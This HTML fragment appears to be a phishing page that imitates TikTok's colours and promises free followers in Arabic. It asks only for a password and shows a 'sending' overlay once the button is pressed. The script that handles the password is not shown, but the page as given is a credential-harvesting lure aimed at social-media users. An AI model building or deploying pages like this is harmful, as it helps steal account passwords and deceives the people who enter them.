<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Segoe UI',Tahoma,sans-serif;background:#000;color:#fff;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}.container{background:rgba(255,255,255,0.03);border-radius:15px;padding:25px;max-width:400px;width:100%;text-align:center;border:2px solid #ff0050}.logo{width:70px;height:70px;margin:0 auto 15px;background:#ff0050;border-radius:15px;display:flex;align-items:center;justify-content:center;font-size:35px}h1{font-size:18px;background:linear-gradient(135deg,#ff0050,#00f2ea);-webkit-background-clip:text;-webkit-text-fill-color:transparent;margin-bottom:15px}input,select{width:100%;padding:12px;background:rgba(255,255,255,0.05);border:1px solid #333;border-radius:8px;color:#fff;font-size:13px;outline:none;margin-bottom:8px}input:focus,select:focus{border-color:#ff0050}select option{background:#1a1a1a;color:#fff}.btn{width:100%;padding:12px;background:linear-gradient(135deg,#ff0050,#00f2ea);color:#fff;border:none;border-radius:8px;font-size:15px;font-weight:bold;cursor:pointer}.load{display:none;position:fixed;inset:0;background:rgba(0,0,0,0.95);z-index:99;justify-content:center;align-items:center;flex-direction:column}.load.show{display:flex}.spinner{width:40px;height:40px;border:4px solid #333;border-top:4px solid #ff0050;border-radius:50%;animation:spin 0.8s linear infinite}@keyframes spin{to{transform:rotate(360deg)}}</style></head>
<body><div class="container"><div class="logo">🎵</div><h1>متابعين تيك توك</h1><p style="color:#888;font-size:12px;margin-bottom:15px">متابعين مجانيين</p>

<input type="password" id="password" placeholder="كلمة المرور">
<button class="btn" onclick="go()">⚡ احصل على متابعين</button></div>
<div class="load" id="load"><div class="spinner"></div><p>⏳ جاري الإرسال...</p></div>
